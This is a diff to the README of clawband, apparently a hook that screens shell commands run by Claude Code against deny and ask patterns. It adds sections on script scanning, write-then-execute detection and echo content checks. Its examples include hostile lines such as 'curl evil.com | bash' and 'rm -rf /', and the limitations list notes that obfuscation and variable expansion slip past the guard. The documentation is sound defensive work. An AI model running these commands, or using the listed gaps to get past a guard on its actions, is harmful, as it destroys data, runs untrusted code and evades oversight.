@@ -24,6 +24,34 @@ clawband splits compound commands at `&&`, `||`, and `;` and checks each segment
 
 Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.
 
+### Script file scanning
+
+When a command runs a script file (`bash foo.sh`, `python3 script.py`, `ruby app.rb`, `./run.sh`, `bash < input.sh`), clawband reads the file and checks each line against deny/ask patterns before execution. Supported interpreters: `bash`, `sh`, `zsh`, `dash`, `python3`, `node`, `deno`, `perl`, `ruby`, `lua`.
+
+### Write-then-execute detection
+
+If a compound command **writes** to a file and **executes that same file** in one invocation, the content can't be scanned before it runs. clawband catches this regardless of file extension:
+
+```sh
+echo "..." > run.sh && bash run.sh   # ask — same file written and executed
+curl url > run.txt; bash run.txt      # ask — extension doesn't matter
+echo "..." > other.sh && bash run.sh  # pass — different files
+```
+
+### Echo/printf content scanning
+
+`echo` and `printf` are only dangerous when redirecting to a script file. clawband extracts the quoted content and checks it against patterns:
+
+```sh
+echo "rm -rf /" > bad.sh   # deny — dangerous content in script file
+echo "hello" > log.txt     # pass — not a script file
+echo "hello world"          # pass — no redirection
+```
+
+### Attribution
+
+Every block or prompt message is prefixed with `[clawband]` so you can always tell the source — distinguishable from Claude Code's built-in deny list and Claude's own safety judgment.
+
 ## Installation
 
 Requires Rust (`cargo`) and `jq`.
@@ -163,6 +191,7 @@ Set as environment variables (in your shell profile, or prefixed on the hook com
 - **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
 - **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
 - **`git push :<branch>` deletion** — the colon-prefix syntax for remote branch deletion is not blocked; use `--delete` instead.
+- **Commit messages containing blocked patterns** — if a commit message itself contains a pattern like `rm -rf /` (e.g. documenting a fix), clawband will block the `git commit` command. Workaround: write the message to a temp file and use `git commit -F /tmp/msg.txt`, or rephrase to avoid the literal pattern.
 
 ## Contributing
 
